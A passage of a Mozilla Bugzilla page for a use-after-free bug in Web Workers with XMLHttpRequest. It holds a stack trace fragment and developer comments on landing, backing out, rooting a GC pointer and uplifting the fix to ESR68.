[task 2020-03-27T05:39:54.918Z] 05:39:54     INFO - GECKO(3816) | #14: MessageLoop::RunInternal() [ipc/chromium/src/base/message_loop.cc:315]<br>
[task 2020-03-27T05:39:54.918Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.918Z] 05:39:54     INFO - GECKO(3816) | #15: MessageLoop::RunHandler() [ipc/chromium/src/base/message_loop.cc:309]<br>
[task 2020-03-27T05:39:54.918Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.919Z] 05:39:54     INFO - GECKO(3816) | #16: MessageLoop::Run() [ipc/chromium/src/base/message_loop.cc:291]<br>
[task 2020-03-27T05:39:54.919Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:54.919Z] 05:39:54     INFO - GECKO(3816) | #17: static nsThread::ThreadFunc(void*) [xpcom/threads/nsThread.cpp:466]<br>
[task 2020-03-27T05:39:54.919Z] 05:39:54     INFO -<br>
[task 2020-03-27T05:39:55.528Z] 05:39:55     INFO - GECKO(3816) | #18: _PR_NativeRunThread(void*) [nsprpub/pr/src/threads/combined/pruthr.c:399]<br>
[task 2020-03-27T05:39:55.528Z] 05:39:55     INFO -<br>
[task 2020-03-27T05:39:55.531Z] 05:39:55     INFO - GECKO(3816) | #19: pr_root(void*) [nsprpub/pr/src/md/windows/w95thred.c:139]<br>
[task 2020-03-27T05:39:55.531Z] 05:39:55     INFO -<br>
[task 2020-03-27T05:39:55.534Z] 05:39:55     INFO - GECKO(3816) | #20: ucrtbase.DLL + 0x3e16f<br>
[task 2020-03-27T05:39:55.534Z] 05:39:55     INFO -<br>
[task 2020-03-27T05:39:55.534Z] 05:39:55     INFO - GECKO(3816) | #21: kernel32.dll + 0x4ef3c<br>
[task 2020-03-27T05:39:55.534Z] 05:39:55     INFO -<br>
[task 2020-03-27T05:39:55.534Z] 05:39:55     INFO - GECKO(3816) | #22: ntdll.dll + 0x63618<br>
[task 2020-03-27T05:39:55.534Z] 05:39:55     INFO -<br>
[task 2020-03-27T05:39:55.534Z] 05:39:55     INFO - GECKO(3816) | #23: ntdll.dll + 0x635eb</p>
</div><div class="activity"><div class="change">Flags: needinfo?(bugmail)</div></div></div><div class="change-set" id="c47"><div class="comment" data-id="14720209" data-no="47"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-47" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a29524244_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a29524244_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-47"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-47" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c47">Comment 47</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-27 10:10 PDT" data-time="1585329038">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-47">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-47" data-comment-id="14720209" data-ismarkdown="true" ><p>My local test matrix was primarily using ASAN for most directories, missing the fact that normal <code>MOZ_ASSERT</code>s will not fire in that case although many other DEBUG-only things are run under ASAN.  I&#39;ve corrected the sanity-checking assertion locally and am locally re-running impacted tests under a full DEBUG build and will re-submit shortly.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bugmail)</span></div></div></div><div class="change-set" id="c48"><div class="comment" data-id="14720563" data-no="48"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-48" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a29524244_1689"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a29524244_1689"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-48"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-48" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c48">Comment 48</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-27 13:10 PDT" data-time="1585339842">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-48">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-48" data-comment-id="14720563" data-ismarkdown="true" ><p>Landed: <a href="https://hg.mozilla.org/integration/autoland/rev/1911a0d1e751345189e314a40e439207ecefe6fc" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/1911a0d1e751345189e314a40e439207ecefe6fc</a></p>
<p>Backed out for causing CallbackObject.cpp Hazard failures:</p>
<p><a href="https://hg.mozilla.org/integration/autoland/rev/b261e44b83ad010cbc4c6973dea831260963e1e7" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/b261e44b83ad010cbc4c6973dea831260963e1e7</a></p>
<p>Push with failure: <a href="https://treeherder.mozilla.org/#/jobs?repo=autoland&amp;group_state=expanded&amp;selectedJob=295119136&amp;resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&amp;revision=f41ad60fa0d98fa793bdbb7a74c755467ab45d6e" rel="nofollow">https://treeherder.mozilla.org/#/jobs?repo=autoland&amp;group_state=expanded&amp;selectedJob=295119136&amp;resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&amp;revision=f41ad60fa0d98fa793bdbb7a74c755467ab45d6e</a><br>
Failure log:  <a href="https://treeherder.mozilla.org/logviewer.html#?job_id=295105741&amp;repo=autoland" rel="nofollow">https://treeherder.mozilla.org/logviewer.html#?job_id=295105741&amp;repo=autoland</a><br>
TEST-UNEXPECTED-FAIL | hazards | unrooted &#39;realCallback&#39; of type &#39;JSObject*&#39; live across GC call at dom/bindings/CallbackObject.cpp:245</p>
</div><div class="activity"><div class="change">Flags: needinfo?(bugmail)</div></div></div><div class="change-set" id="c49"><div class="comment" data-id="14720662" data-no="49"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-49" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a29524244_1689"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a29524244_1689"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-49"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-49" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c49">Comment 49</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-27 14:06 PDT" data-time="1585343211">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-49">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-49" data-comment-id="14720662" data-ismarkdown="true" ><p>I&#39;ve consulted with :sfink on the hazard analysis which did not like the QueryInterface calls performed in <a href="https://searchfox.org/mozilla-central/rev/8526066f548af9ec3ebb462ff73c47ccc183f533/js/xpconnect/wrappers/WrapperFactory.cpp#843" rel="nofollow">https://searchfox.org/mozilla-central/rev/8526066f548af9ec3ebb462ff73c47ccc183f533/js/xpconnect/wrappers/WrapperFactory.cpp#843</a>.  This call previously didn&#39;t matter because the unrooted <code>realCallback</code> was not used beyond the call.  But with the forbidden script check refactoring, it is.</p>
<p>Given the analytical issues involved, we&#39;ve opted to go with rooting <code>realCallback</code>.  Since the patch has already been rendered public already by the 2 bounced landings, I&#39;ve pushed a hazard analysis job to try and will re-land assuming that comes back green:<br>
<a href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=e71b9e9ea2372febb5593034e1c0c0e30cb117d6" rel="nofollow">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=e71b9e9ea2372febb5593034e1c0c0e30cb117d6</a></p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bugmail)</span></div></div></div><div class="change-set" id="c50"><div class="comment" data-id="14721184" data-no="50"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-50" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a29524244_1689"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a29524244_1689"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-50"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-50" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c50">Comment 50</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-28 02:38 PDT" data-time="1585388297">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-50">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-50" data-comment-id="14721184" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/integration/autoland/rev/cb814ebff5a56845db97bbed1ef52b0c523661f1" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/cb814ebff5a56845db97bbed1ef52b0c523661f1</a><br>
<a href="https://hg.mozilla.org/mozilla-central/rev/cb814ebff5a5" rel="nofollow">https://hg.mozilla.org/mozilla-central/rev/cb814ebff5a5</a></p>
</div><div class="activity"><div class="change">Group: dom-core-security &rarr; core-security-release</div><div class="change">Status: ASSIGNED &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2020-03-28 02:38 PDT" data-time="1585388297">2 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox76&amp;o1=isnotempty">status-firefox76</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox76&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox76&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Resolution: --- &rarr; FIXED</div><div class="change">Target Milestone: --- &rarr; mozilla76</div></div></div><div class="change-set" id="c51"><div class="comment" data-id="14725164" data-no="51"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-51" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a29524244_1689"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a29524244_1689"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-51"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-51" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c51">Comment 51</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-30 14:18 PDT" data-time="1585603081">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-51">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-51" data-comment-id="14725164" data-ismarkdown="true" ><p>(not urgent) Looks like this&#39;ll eventually need a rebased patch for ESR68.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=isnotempty">tracking-firefox-esr68</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=equals&amp;v1=%3F">?</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=equals&amp;v1=76%2B">76+</a></div><div class="change">Flags: needinfo?(bugmail)</div></div></div><div class="change-set" id="a30106619_553429"><div class="change" id="aa30106619_553429">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_553429" id="a30106619_553429"><img src="https://secure.gravatar.com/avatar/468d4236db8a9810a9043dbbd470fc25?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_553429" id="a30106619_553429"><a class="email " href="/user_profile?user_id=553429" > <span class="fna">Brindusa Tot[:brindusat]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a30106619_553429"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a30106619_553429">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a30106619_553429">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-03-31 08:41 PDT" data-time="1585669294">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: qe-verify+</div><div class="change">Whiteboard: [post-critsmash-triage]</div></div></div><div class="change-set" id="c52"><div class="comment" data-id="14739734" data-no="52"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-52" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_616104" id="a30106619_553429"><img src="https://secure.gravatar.com/avatar/84c1369b3b8056197620554093523b37?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_616104" id="a30106619_553429"><a class="email " href="/user_profile?user_id=616104" > <span class="fna">Bodea Daniel [:danibodea]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-52"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-52" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c52">Comment 52</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-06 22:02 PDT" data-time="1586235765">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-52">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-52" data-comment-id="14739734" data-ismarkdown="true" ><p>I am attempting to verify this fix, but I am having trouble creating the server correctly. Can you provide more detailed steps (or a tutorial that I could understand) on the server creation part? My skills stop at the creation of the Simple HTTP server. Thank you.</p>
</div></div><div class="change-set" id="c53"><div class="comment" data-id="14740445" data-no="53"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-53" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a30106619_553429"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a30106619_553429"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-53"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-53" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c53">Comment 53</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-07 07:16 PDT" data-time="1586268961">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-53">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-53" data-comment-id="14740445" data-ismarkdown="true" ><p>A number of other accidentally mitigating fixes have meant that the reproducing test cases haven&#39;t worked for a very long time.  We&#39;re still pursuing fuzzer improvements to help provide confirmation of the fixes, but for now the fix can&#39;t be verified.</p>
</div><div class="activity"><div class="change">Flags: qe-verify+ &rarr; qe-verify-</div></div></div><div class="change-set" id="c54"><div class="comment" data-id="14764091" data-no="54"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-54" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a30106619_553429"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a30106619_553429"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-54"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-54" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c54">Comment 54</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-19 21:44 PDT" data-time="1587357874">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-54">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9141601"
         class="attachment"
         data-id="9141601" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D71503-url.txt">
      <meta itemprop="contentSize" content="47">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9141601" itemprop="contentUrl">
        <span id="att-9141601-description" itemprop="description">Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug</span></a>
        — <a href="attachment.cgi?id=9141601&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="c55"><div class="comment" data-id="14764095" data-no="55"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-55" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a30106619_553429"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a30106619_553429"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-55"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-55" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c55">Comment 55</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-19 21:51 PDT" data-time="1587358313">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-55">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-55" data-comment-id="14764095" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9141601" name="attach_9141601" title="Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug">attachment 9141601</a> <a href="/attachment.cgi?id=9141601&amp;action=edit" title="Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">Bug 1545345</a> - Improve worker shutdown on ESR68. r=baku,smaug</p>
<h3>ESR Uplift Approval Request</h3>
<ul>
<li><strong>If this is not a sec:{high,crit} bug, please state case for ESR consideration</strong>:</li>
<li><strong>User impact if declined</strong>:</li>
<li><strong>Fix Landed on Version</strong>:</li>
<li><strong>Risk to taking this patch</strong>: Low</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: It seems to have not exploded anything on the branches it already landed on.</li>
<li><strong>String or UUID changes made by this patch</strong>:</li>
</ul>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bugmail)</span></div><div class="change">
        <a href="/attachment.cgi?id=9141601&amp;action=edit"
           title="Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug"
           class=""
        >Attachment #9141601</a> -
        Flags: approval-mozilla-esr68?</div></div></div><div class="change-set" id="c56"><div class="comment" data-id="14764096" data-no="56"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-56" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a30106619_553429"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a30106619_553429"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-56"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-56" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c56">Comment 56</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-19 21:54 PDT" data-time="1587358497">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-56">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-56" data-comment-id="14764096" data-ismarkdown="true" ><p>Patch is now updated for ESR68 in that separate phabricator request.  I did some local testing with a debug build and explicitly including the test that caused the initial landing bounce.  I did not push to try.  I requested the uplift approval in case that&#39;s desired.</p>
</div></div><div class="change-set" id="c57"><div class="comment" data-id="14766623" data-no="57"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-57" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a30106619_553429"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a30106619_553429"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-57"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-57" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c57">Comment 57</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-20 08:02 PDT" data-time="1587394938">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-57">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-57" data-comment-id="14766623" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9141601" name="attach_9141601" title="Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug">attachment 9141601</a> <a href="/attachment.cgi?id=9141601&amp;action=edit" title="Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">Bug 1545345</a> - Improve worker shutdown on ESR68. r=baku,smaug</p>
<p>Approved for 68.8esr.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9141601&amp;action=edit"
           title="Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug"
           class=""
        >Attachment #9141601</a> -
        Flags: approval-mozilla-esr68? &rarr; approval-mozilla-esr68+</div></div></div><div class="change-set" id="c58"><div class="comment" data-id="14766917" data-no="58"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-58" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a30106619_553429"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a30106619_553429"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-58"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-58" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c58">Comment 58</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-20 09:39 PDT" data-time="1587400755">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-58">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-58" data-comment-id="14766917" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/releases/mozilla-esr68/rev/45d7ff077528" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr68/rev/45d7ff077528</a></p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=isnotempty">status-firefox-esr68</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="a32601860_428608"><div class="change" id="aa32601860_428608">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a32601860_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_428608" id="a32601860_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a32601860_428608"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a32601860_428608">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a32601860_428608">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-29 05:48 PDT" data-time="1588164535">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
